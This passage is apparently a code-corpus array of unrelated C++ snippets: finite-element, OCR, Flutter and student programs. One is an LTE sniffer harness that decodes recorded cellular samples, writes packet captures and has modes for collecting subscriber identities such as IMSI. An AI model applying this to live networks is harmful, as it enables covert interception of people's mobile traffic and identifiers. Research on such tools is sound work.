\"mtop_integrators.hpp\"\n\nint main(int argc, char *argv[])\n{\n   const char *mesh_file = \"../../data/star.vtk\";\n   int ser_ref_levels = 1;\n   int order = 2;\n   bool visualization = false;\n   double newton_rel_tol = 1e-4;\n   double newton_abs_tol = 1e-6;\n   int newton_iter = 10;\n   int print_level = 0;\n\n   mfem::OptionsParser args(argc, argv);\n   args.AddOption(&mesh_file, \"-m\", \"--mesh\", \"Mesh file to use.\");\n   args.AddOption(&ser_ref_levels,\n                  \"-rs\",\n                  \"--refine-serial\",\n                  \"Number of times to refine the mesh uniformly in serial.\");\n   args.AddOption(&order,\n                  \"-o\",\n                  \"--order\",\n                  \"Order (degree) of the finite elements.\");\n   args.AddOption(&visualization,\n                  \"-vis\",\n                  \"--visualization\",\n                  \"-no-vis\",\n                  \"--no-visualization\",\n                  \"Enable or disable GLVis visualization.\");\n   args.AddOption(&newton_rel_tol,\n                  \"-rel\",\n                  \"--relative-tolerance\",\n                  \"Relative tolerance for the Newton solve.\");\n   args.AddOption(&newton_abs_tol,\n                  \"-abs\",\n                  \"--absolute-tolerance\",\n                  \"Absolute tolerance for the Newton solve.\");\n   args.AddOption(&newton_iter,\n                  \"-it\",\n                  \"--newton-iterations\",\n                  \"Maximum iterations for the Newton solve.\");\n   args.Parse();\n   if (!args.Good())\n   {\n      args.PrintUsage(std::cout);\n      return 1;\n   }\n   args.PrintOptions(std::cout);\n\n   // Read the (serial) mesh from the given mesh file on all processors. We\n   // can handle triangular, quadrilateral, tetrahedral and hexahedral meshes\n   // with the same code.\n   mfem::Mesh *mesh = new mfem::Mesh(mesh_file, 1, 1);\n   int dim = mesh->Dimension();\n\n   // Refine the mesh in serial to increase the resolution. In this example\n   // we do 'ser_ref_levels' of uniform refinement, where 'ser_ref_levels' is\n   // a command-line parameter.\n   for (int lev = 0; lev < ser_ref_levels; lev++)\n   {\n      mesh->UniformRefinement();\n   }\n\n   // Diffusion coefficient\n   mfem::ConstantCoefficient* diffco=new mfem::ConstantCoefficient(1.0);\n   // Heat source\n   mfem::ConstantCoefficient* loadco=new mfem::ConstantCoefficient(1.0);\n   // Define the q-function\n   mfem::QLinearDiffusion* qfun=new mfem::QLinearDiffusion(*diffco,*loadco,1.0,\n                                                           1e-7,4.0,0.5);\n\n   // Define FE collection and space for the state solution\n   mfem::H1_FECollection sfec(order, dim);\n   mfem::FiniteElementSpace* sfes=new mfem::FiniteElementSpace(mesh,&sfec,1);\n   // Define FE collection and space for the density field\n   mfem::L2_FECollection pfec(order, dim);\n   mfem::FiniteElementSpace* pfes=new mfem::FiniteElementSpace(mesh,&pfec,1);\n\n   // Define the arrays for the nonlinear form\n   mfem::Array<mfem::FiniteElementSpace*> asfes;\n   mfem::Array<mfem::FiniteElementSpace*> apfes;\n\n   asfes.Append(sfes);\n   apfes.Append(pfes);\n   // Define parametric ",
    "// #pragma once\n\n#include \"read_sample.h\"\n\n// g++ -std=c++11 -I/usr/local/include -L/usr/local/lib read_sample.cpp -luhd  -o read_sample\n\n// Assuming the file is a binary file containing complex<float> data\nstd::vector<std::complex<float>> read_from_file(const std::string& filename) {\n    std::ifstream file(filename, std::ios::binary);\n    std::vector<std::complex<float>> buffer;\n\n    if (file.is_open()) {\n        std::complex<float> value;\n        while (file.read(reinterpret_cast<char*>(&value), sizeof(std::complex<float>))) {\n            buffer.push_back(value);\n        }\n        file.close();\n    }\n\n    return buffer;\n}\n\nint main(){\n    std::vector<std::complex<float>> dl_buffer = read_from_file(\"/home/anonymous/signal_data/dl_samples_0.bin\");\n    std::vector<std::complex<float>> ul_buffer = read_from_file(\"/home/anonymous/signal_data/ul_samples_0.bin\");\n\n    int srsran_rf_recv_wrapper( void* h,\n                            cf_t* data_[SRSRAN_MAX_PORTS], \n                            uint32_t nsamples, \n                            srsran_timestamp_t* t);\n\n    // initial configuration\n    cell_search_cfg_t cell_detect_config = {.max_frames_pbch    = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,\n                                        .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,\n                                        .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,\n                                        .init_agc             = 0,\n                                        .force_tdd            = false};\n    srsran_cell_t      cell;\n    falcon_ue_dl_t     falcon_ue_dl;\n    srsran_dl_sf_cfg_t dl_sf;\n    srsran_pdsch_cfg_t pdsch_cfg;\n    srsran_ue_sync_t   ue_sync;\n    srsran_rf_t* rf;\n    \n    // Cell Config\n    cell.nof_prb          = 50;\n    cell.id               = 1;\n    cell.nof_ports        = 2;\n    cell.cp               = SRSRAN_CP_NORM;\n    cell.phich_length     = SRSRAN_PHICH_NORM;\n    cell.phich_resources  = SRSRAN_PHICH_R_1_6;\n\n    // Args Config\n\n    uint32_t nof_subframes = DEFAULT_NOF_SUBFRAMES_TO_CAPTURE;\n    int cpu_affinity = -1;\n    bool enable_ASCII_PRB_plot = true;\n    bool enable_ASCII_power_plot = false;\n    bool disable_cfo = false;\n    uint32_t time_offset = 0;\n    int force_N_id_2 = -1; // Pick the best\n    int file_offset_time = 0;\n    double file_offset_freq = 0;\n    uint32_t nof_prb = DEFAULT_NOF_PRB;\n    uint32_t file_nof_prb = DEFAULT_NOF_PRB;\n    uint32_t file_nof_ports = DEFAULT_NOF_PORTS;\n    uint32_t file_cell_id = 0;\n    bool file_wrap = false;\n\n    double rf_freq = 2680e6;\n    double ul_freq = 2560e6;\n    uint32_t rf_nof_rx_ant = DEFAULT_NOF_RX_ANT;\n    int decimate = 0;\n    int nof_sniffer_thread = DEFAULT_NOF_THREAD;\n    // other args\n    uint32_t dci_format_split_update_interval_ms = DEFAULT_DCI_FORMAT_SPLIT_UPDATE_INTERVAL_MS;\n    double dci_format_split_ratio = DEFAULT_DCI_FORMAT_SPLIT_RATIO;\n    bool skip_secondary_meta_formats = false;\n    bool enable_shortcut_discovery = true;\n    uint32_t rnti_histogram_threshold = DEFAULT_RNTI_HISTOGRAM_THRESHOLD;\n    std::string pcap_file = \"ul_sniffer.pcap\";\n    int harq_mode = 0;\n    uint16_t rnti = SRSRAN_SIRNTI;\n    int mcs_tracking_mode = 1;\n    // char* rf_dev = \"\";\n    int verbose = 0;\n    int enable_cfo_ref = 1;\n    std::string estimator_alg = \"interpolate\";\n    bool cell_search = false;\n    uint32_t cell_id = 0;\n    int sniffer_mode = 1;\n    uint16_t target_rnti = 0;\n    bool en_debug = false;\n    int api_mode = -1; //api functions, 0: identity mapping, 1: UECapa, 2: IMSI, 3: all functions\n\n    // rf_buffer_interface* buffer;\n    srsran::rf_buffer_interface* buf;\n    // buf->set_nof_samples();\n    HARQ harq;\n    harq.init_HARQ(harq_mode);\n    UL_HARQ  ul_harq;\n    ULSchedule  ulsche(target_rnti, &ul_harq, en_debug);\n    ulsche.set_multi_offset(sniffer_mode);\n\n    int ret, n;                 // return\n    uint8_t mch_table[10];      // unknown\n    float search_cell_cfo = 0;  // freg. offset\n    uint32_t sfn = 0;           // system frame number\n    uint32_t skip_cnt = 0;      // number of skipped subframe\n    uint32_t total_sf = 0;\n    uint32_t skip_last_1s = 0;\n    uint16_t nof_lost_sync = 0;\n    int mcs_tracking_timer = 0;\n    int update_rnti_timer = 0;\n\n    int srate = srsran_sampling_freq_hz(cell.nof_prb);\n    if (srate != -1) {\n      printf(\"Setting sampling rate %.2f MHz\\n\", (float)srate / 1000000);\n    //   float srate_rf = srsran_rf_set_rx_srate(&rf, (double)srate);\n    }\n\n    std::string input_file_name = \"/home/anonymous/signal_data/1845.bin.sigmf-data\";\n\n    char* tmp_filename = new char[input_file_name.length()+1];\n    strncpy(tmp_filename, input_file_name.c_str(), input_file_name.length());\n    tmp_filename[input_file_name.length()] = 0;\n    if (srsran_ue_sync_init_file_multi(&ue_sync,\n                                       cell.nof_prb,\n                                       tmp_filename,\n                                       file_offset_time,\n                                       file_offset_freq,\n ",
    "#include \"LineSegmentation.hpp\"\n\nLineSegmentation::LineSegmentation() {\n    sieve();\n};\n\nvoid LineSegmentation::segment(Mat &input, vector<Mat> &output, int chunksNumber, int chunksProcess) {\n    this->binaryImg = input.clone();\n    this->chunksNumber = chunksNumber;\n    this->chunksToProcess = chunksProcess;\n\n    getContours();\n    generateChunks();\n    getInitialLines();\n\n    if (this->initialLines.size() > 0){\n        generateRegions();\n        repairLines();\n        generateRegions();\n        printLines(input);\n        getRegions(output);\n    } else {\n        output.push_back(input);\n    }\n\n    for(int i=0; i<output.size(); i++)\n        deslant(output[i], output[i], 255);\n}\n\nvoid LineSegmentation::sieve() {\n    for (int i=0; i<1e5; ++i) {\n        notPrimesArr[i] = 0;\n    }\n\n    notPrimesArr[0] = notPrimesArr[1] = 1;\n\n    for (int i=2; i<1e5; ++i) {\n        if (notPrimesArr[i]) continue;\n\n        primes.push_back(i);\n        for (int j=i*2; j<1e5; j += i) {\n            notPrimesArr[j] = 1;\n        }\n    }\n}\n\nvoid LineSegmentation::addPrimesToVector(int n, vector<int> &probPrimes) {\n    for (int i=0; i<primes.size(); ++i) {\n        while (n % primes[i]) {\n            n /= primes[i];\n            probPrimes[i]++;\n        }\n    }\n}\n\nvoid LineSegmentation::printLines(Mat &inputOutput) {\n    cvtColor(inputOutput, inputOutput, COLOR_GRAY2BGR);\n\n    for (auto line : initialLines) {\n        int lastRow = -1;\n\n        for (auto point : line->points) {\n            inputOutput.at<Vec3b>(point.x, point.y) = Vec3b(0,0,255);\n\n            if (lastRow != -1 && point.x != lastRow) {\n                for (int i=min(lastRow, point.x); i<max(lastRow, point.x); i++)\n                    inputOutput.at<Vec3b>(i, point.y) = Vec3b(0,0,255);\n            }\n            lastRow = point.x;\n        }\n    }\n}\n\nvoid LineSegmentation::getContours() {\n    vector<vector<Point>> contours;\n    vector<Vec4i> hierarchy;\n    findContours(this->binaryImg, contours, hierarchy, RETR_LIST, CHAIN_APPROX_NONE, Point(0, 0));\n\n    vector<vector<Point>> contoursPoly(contours.size());\n    vector<Rect> boundRect(contours.size()-1);\n\n    for (size_t i=0; i<contours.size()-1; i++) {\n        approxPolyDP(Mat(contours[i]), contoursPoly[i], 1, true);\n        boundRect[i] = boundingRect(Mat(contoursPoly[i]));\n    }\n\n    Rect2d rectangle3;\n    vector<Rect> mergedRectangles;\n    bool isRepeated;\n    cvtColor(this->binaryImg, this->contoursDrawing, COLOR_GRAY2BGR);\n\n    for (int i=0; i<boundRect.size(); i++) {\n        isRepeated = false;\n\n        for (int j=i+1; j<boundRect.size(); j++) {\n            rectangle3 = boundRect[i] & boundRect[j];\n\n            if ((rectangle3.area() == boundRect[i].area()) || (rectangle3.area() == boundRect[j].area())) {\n                isRepeated = true;\n                rectangle3 = boundRect[i] | boundRect[j];\n                Rect2d mergedRectangle(rectangle3.tl().x, rectangle3.tl().y, rectangle3.width, rectangle3.height);\n\n                if (j == boundRect.size() - 2)\n                    mergedRectangles.push_back(mergedRectangle);\n\n                boundRect[j] = mergedRectangle;\n            }\n        }\n        if (!isRepeated)\n            mergedRectangles.push_back(boundRect[i]);\n    }\n\n    for (size_t i=0; i<mergedRectangles.size(); i++)\n        rectangle(this->contoursDrawing, mergedRectangles[i].tl(), mergedRectangles[i].br(), Vec3b(0,0,255), 2, 8, 0);\n\n    this->contours = mergedRectangles;\n}\n\nvoid LineSegmentation::generateChunks() {\n    int width = binaryImg.cols;\n    chunkWidth = width / chunksNumber;\n\n    for (int i=0, startPixel=0; i<chunksNumber; ++i) {\n        Chunk *c = new Chunk(\n            i, \n            startPixel, \n            chunkWidth, \n            Mat(binaryImg, Range(0, binaryImg.rows), Range(startPixel, startPixel + chunkWidth)));\n\n        this->chunks.push_back(c);\n        startPixel += chunkWidth;\n    }\n}\n\nvoid LineSegmentation::getInitialLines() {\n    int numberOfHeights = 0, valleysMinAbsDist = 0;\n\n    for (int i=0; i<chunksToProcess; i++) {\n        int avgHeight = this->chunks[i]->findPeaksValleys(mapValley);\n\n        if (avgHeight) numberOfHeights++;\n        valleysMinAbsDist += avgHeight;\n    }\n    valleysMinAbsDist /= numberOfHeights;\n    this->predictedLineHeight = valleysMinAbsDist;\n\n    for (int i=chunksToProcess-1; i >= 0; i--) {\n        if (chunks[i]->valleys.empty()) continue;\n\n        for (auto &valley : chunks[i]->valleys) {\n            if (valley->used) continue;\n            valley->used = true;\n\n            Line *newLine = new Line(valley->valleyID);\n            newLine = connectValleys(i-1, valley, newLine, valleysMinAbsDist);\n            newLine->generateInitialPoints(chunksNumber, chunkWidth, binaryImg.cols, mapValley);\n\n            if (newLine->valleysID.size() > 1)\n                this->initialLines.push_back(newLine);\n        }\n    }\n}\n\nLine * LineSegmentation::connectValleys(int i, Valley *currentValley, Line *line, int valleysMinAbsDist) {\n    if (i <= 0 || chunks[i]->valleys.empty())",
    "#define _CRT_SECURE_NO_WARNINGS  // \u00ed\u00f3\u00e6\u00ed\u00ee \u00e8\u00f1\u00ef\u00ee\u00eb\u00fc\u00e7\u00ee\u00e2\u00e0\u00f2\u00fc \u00ef\u00f0\u00e8 \u00f0\u00e0\u00e1\u00ee\u00f2\u00e5 \u00f1 \u00f4\u00e0\u00e9\u00eb\u00e0\u00ec\u00e8\n#include <iostream>\n#include <Windows.h>\n#include <vector>\n#include <string>\n#include <cstdio>  // \u00ed\u00f3\u00e6\u00ed\u00e0 \u00ef\u00f0\u00e8 \u00f0\u00e0\u00e1\u00ee\u00f2\u00e5 \u00f1 \u00f4\u00e0\u00e9\u00eb\u00e0\u00ec\u00e8 fgets fputs\n#include <cstring> // \u00e4\u00eb\u00ff \u00f0\u00e0\u00e1\u00ee\u00f2\u00fb \u00f1 char* string[];\n#include \"PhoneBook.h\"\nusing namespace std;\n\n\n//\u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0\u00fb\n\nPhoneBook::PhoneBook(int _number, char* _fio, char* _homephone, char* _workphone, char* _mobphone, char* _INFO):\n\tcountOfAbonent{ _number }, FIO{ _fio ? new char[strlen(_fio) + 1] : nullptr },\n\tHomePhone{ _homephone ? new char[strlen(_homephone) + 1] : nullptr },\n\tWorkPhone{ _workphone ? new char[strlen(_workphone) + 1] : nullptr },\n\tMobPhone{ _mobphone ? new char[strlen(_mobphone) + 1] : nullptr },\n\tAbonentInfo{ _INFO ? new char[strlen(_INFO) + 1] : nullptr }\n{\n\tif (FIO)\n\t\tstrcpy_s(FIO, strlen(_fio) + 1, _fio);\n\tif (HomePhone)\n\t\tstrcpy_s(HomePhone, strlen(_homephone) + 1, _homephone);\n\tif (WorkPhone)\n\t\tstrcpy_s(WorkPhone, strlen(_workphone) + 1, _workphone);\n\tif (MobPhone)\n\t\tstrcpy_s(MobPhone, strlen(_mobphone) + 1, _mobphone);\n\tif (AbonentInfo)\n\t\tstrcpy_s(AbonentInfo, strlen(_INFO) + 1, _INFO);\n}\n\nPhoneBook::PhoneBook() : countOfAbonent{ 0 }, FIO{ new char[3] {\"No\"} }, HomePhone{ new char[3] {\"No\"} },\n\tWorkPhone{ new char[3] {\"No\"} }, MobPhone{ new char[3] { \"No\" } },\n\tAbonentInfo{ new char[3] {\"No\"} }{}\n\nPhoneBook::PhoneBook(int _number) : countOfAbonent{ _number }, FIO{ new char[3] {\"No\"} }, HomePhone{ new char[3] {\"No\"} },\n\tWorkPhone{ new char[3] {\"No\"} }, MobPhone{ new char[3] { \"No\" } }, AbonentInfo{ new char[3] {\"No\"} } {}\n\nPhoneBook::PhoneBook(int _number, char* _fio) : countOfAbonent{ _number }, FIO{ _fio ? new char[strlen(_fio) + 1] : nullptr }, HomePhone{ new char[3] {\"No\"} },\n\tWorkPhone{ new char[3] {\"No\"} }, MobPhone{ new char[3] { \"No\" } },\n\tAbonentInfo{ new char[3] {\"No\"} } \n{\n\tif (FIO)\n\t\tstrcpy_s(FIO, strlen(_fio) + 1, _fio);\n}\n\nPhoneBook::PhoneBook(int _number, char* _fio, char* _homephone) : countOfAbonent{ _number }, FIO{ _fio ? new char[strlen(_fio) + 1] : nullptr },\n\tHomePhone{ _homephone ? new char[strlen(_homephone) + 1] : nullptr }, WorkPhone{ new char[3] {\"No\"} }, MobPhone{ new char[3] { \"No\" } },\n\tAbonentInfo{ new char[3] {\"No\"} }\n{\n\tif (FIO)\n\t\tstrcpy_s(FIO, strlen(_fio) + 1, _fio);\n\tif (HomePhone)\n\t\tstrcpy_s(HomePhone, strlen(_homephone) + 1, _homephone);\n}\n\nPhoneBook::PhoneBook(int _number, char* _fio, char* _homephone, char* _workphone) : countOfAbonent{ _number }, FIO{ _fio ? new char[strlen(_fio) + 1] : nullptr },\n\tHomePhone{ _homephone ? new char[strlen(_homephone) + 1] : nullptr }, WorkPhone{ _workphone ? new char[strlen(_workphone) + 1] : nullptr },\n\tMobPhone{ new char[3] { \"No\" } }, AbonentInfo{ new char[3] {\"No\"} }\n{\n\tif (FIO)\n\t\tstrcpy_s(FIO, strlen(_fio) + 1, _fio);\n\tif (HomePhone)\n\t\tstrcpy_s(HomePhone, strlen(_homephone) + 1, _homephone);\n\tif (WorkPhone)\n\t\tstrcpy_s(WorkPhone, strlen(_workphone) + 1, _workphone);\n}\n\nPhoneBook::PhoneBook(int _number, char* _fio, char* _homephone, char* _workphone, char* _mobphone) : countOfAbonent{ _number }, FIO{ _fio ? new char[strlen(_fio) + 1] : nullptr },\nHomePhone{ _homephone ? new char[strlen(_homephone) + 1] : nullptr }, WorkPhone{ _workphone ? new char[strlen(_workphone) + 1] : nullptr },\nMobPhone{ _mobphone ? new char[strlen(_mobphone) + 1] : nullptr }, AbonentInfo{ new char[3] {\"No\"} }\n{\n\tif (FIO)\n\t\tstrcpy_s(FIO, strlen(_fio) + 1, _fio);\n\tif (HomePhone)\n\t\tstrcpy_s(HomePhone, strlen(_homephone) + 1, _homephone);\n\tif (WorkPhone)\n\t\tstrcpy_s(WorkPhone, strlen(_workphone) + 1, _workphone);\n\tif (MobPhone)\n\t\tstrcpy_s(MobPhone, strlen(_mobphone) + 1, _mobphone);\n}\n\n//PhoneBook::~PhoneBook()   // \u00e8\u00f1\u00ef\u00ee\u00eb\u00fc\u00e7\u00f3\u00e5\u00f2\u00f1\u00ff vector \u00e4\u00e5\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00ed\u00e5 \u00ed\u00f3\u00e6\u00e5\u00ed\n//{\n//\tdelete[]FIO;\n//\tdelete[]HomePhone;\n//\tdelete[]WorkPhone;\n//\tdelete[]MobPhone;\n//\tdelete[]AbonentInfo;\n//}\n\nvoid PhoneBook::InterNewUserData(int EndNum)\n{\n\tchar temp_fio[100], temp_homePhon[100], temp_WorkPhon[100], temp_MobPhon[100], temp_abonInfo[100];\n\tSetCountAbon(EndNum);\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00d4\u00c8\u00ce \u00e0\u00e1\u00ee\u00ed\u00e5\u00ed\u00f2\u00e0:    \";\n\tcin.getline(temp_fio, 100);\n\tcin.getline(temp_fio, 100);\n\tSetFIO(temp_fio);\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e4\u00ee\u00ec\u00e0\u00f8\u00ed\u00e8\u00e9 \u00f2\u00e5\u00eb:    \";\n\tcin.getline(temp_homePhon, 100);\n\tSetHomePhone(temp_homePhon);\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f0\u00e0\u00e1\u00ee\u00f7\u00e8\u00e9 \u00f2\u00e5\u00eb:     \";\n\tcin.getline(temp_WorkPhon, 100);\n\tSetWorkPhone(temp_WorkPhon);\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ec\u00ee\u00e1\u00e8\u00eb\u00fc\u00ed\u00fb\u00e9 \u00f2\u00e5\u00eb:   \";\n\tcin.getline(temp_MobPhon, 100);\n\tSetMobPhone(temp_MobPhon);\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e4\u00ee\u00ef. \u00e8\u00ed\u00f4\u00ee\u00f0\u00ec\u00e0\u00f6\u00e8\u00fe: \";\n\tcin.getline(temp_abonInfo, 100);\n\tSetINFO(temp_abonInfo);\n}\n\nvoid PhoneBook::ShowPhoneBookAbonent(std::vector<PhoneBook>& TelBook)\n{\n\tchar find[100];\n\tint len_find, ZeroAbonent{ 0 };\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f7\u00e0\u00f1\u00f2\u00fc \u00d4\u00c8\u00ce \u00e0\u00e1\u00ee\u00ed\u00e5\u00ed\u00f2\u00e0: \";\n\tcin.getline(find, 100);\n\tcin.getline(find, 100);\n\tlen_find = strlen(find);\n\tfor (auto start{ TelBook.begin() }; start != TelBook.end(); start++)\n\t{\n\t\tif (strstr(start->GetFIO(), find) != NULL) {\n\t\t\tZeroAbonent++;\n\t\t\tcout << \"\\n\" << start->Getnumber() << \" :(\u00d4\u00c8\u00ce)   \" << start->GetFIO() << endl;\n\t\t\tcout << \"\u00c4\u00ee\u00ec\u00e0\u00f8\u00ed\u00e8\u00e9 \u00f2\u00e5\u00eb.:         \" << sta",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"movies\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\n\nvoid menu();\nvoid tablas();\nvoid segundoEjercicio();\nvoid primos();\nvoid pregunta();\n\n\nint main()\n{\n    menu();\n}\n\nvoid menu() {\n    cout << \"Hola usuario\" << endl;\n    cout << \"Seleccione un ejercicio \" << endl;\n    cout << \"1. Tablas de multiplicar\" << endl;\n    cout << \"2. Ingresar un numero y condiciones\" << endl;\n    cout << \"3. Primos\" << endl;\n\n    cout << \"\\nIngrese su seleccion: \";\n    int seleccion;\n    cin >> seleccion;\n\n    switch (seleccion)\n    {\n    case 1:\n        tablas();\n        break;\n    case 2:\n        segundoEjercicio();\n        break;\n    case 3:\n        primos();\n        break;\n    default:\n        break;\n    }\n}\n\nvoid tablas() {\n    system(\"cls\");\n    cout << \"\\nIngrese un numero por favor: \";\n    int num;\n    cin >> num;\n\n    for (int i = 1; i < 11; i++) {\n        int resultado = num * i;\n        cout << num << \" X \" << i << \" = \" << resultado << endl;\n    }\n\n    pregunta();\n}\n\nvoid segundoEjercicio() {\n    system(\"cls\");\n    cout << \"\\nIngrese un numero: \";\n    int num1;\n    cin >> num1;\n\n    int suma=0;\n    if (num1 % 2 != 0) {\n        for (int i = 0; i <= num1; i++) {\n            if (i % 2 != 0)\n                suma += i;\n        }\n    }\n    else {\n        for (int i = 0; i <= num1; i++) {\n            if (i % 2 == 0)\n                suma += i;\n        }\n    }\n\n    cout << \"El resultado de la suma es: \" << suma << endl;\n\n    pregunta();\n}\n\nvoid primos() {\n    cout << \"\\nIngrese un numero: \";\n    int num1,contadorPrimos=0;\n    cin >> num1;\n    for (int i = 1; i <= num1; i++) {\n        if (num1 % i == 0)\n            contadorPrimos++;\n    }\n\n    if (contadorPrimos <= 2)\n        cout << num1 << \" es un numero primo\" << endl;\n    else\n        cout << num1 << \" no es un numero primo\" << endl;\n\n    pregunta();\n}\n\nvoid pregunta() {\n    cout << \"Desea realizar algun otro ejercicio?\" << endl;\n    cout << \"Presione Y si desea realizar otro ejercicio, en caso contrario presione N\" << endl;\n    char seleccion;\n    cin >> seleccion;\n\n    if (seleccion == 'y') {\n        system(\"cls\");\n        menu();\n    }\n    else if (seleccion == 'n') {\n        cout << \"nos vemos usuario\" << endl;\n    }\n    else {\n        cout << \"Seleccione una tecla valida\" << endl;\n        pregunta();\n    }\n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nconst int inf = 0x3f3f3f3f;\n\nint main() {\n    int n, m;\n    cin >> m >> n;\n    cin.ignore();\n    \n    vector<pair<int, int>> adj[n + 1];\n    for (int i = 1; i <= m; i++) {\n        string line;\n        getline(cin, line);\n        istringstream iss(line);\n\n        int x;\n        bool flag = true;\n        int last;\n        while (iss >> x) {\n            if (flag) {\n                flag = false;\n                last = x;\n            } else {\n                adj[last].push_back({x, i});\n                last = x;\n            }\n        }\n    }\n\n    vector<bool> vis(n + 1, 0);\n    vector<int> dis(n + 1, inf);\n    vector<int> ty(n + 1, -1);\n    dis[1] = 0;\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> q;\n    q.push({0, 1});\n    while (q.size()) {\n        int u = q.top().second;\n        q.pop();\n        if (vis[u]) continue;\n        vis[u] = true;\n\n        for (auto [v, w] : adj[u]) {\n            if (dis[v] >= dis[u] + (ty[u] != w)) {\n                dis[v] = dis[u] + (ty[u] != w);\n                ty[v] = w;\n                // if (v == 50) cout << u << ' ' << v << ' ' << ty[u] << endl;\n                q.push({dis[v], v});\n            }\n        }\n    }\n\n    if (dis[n] == inf) 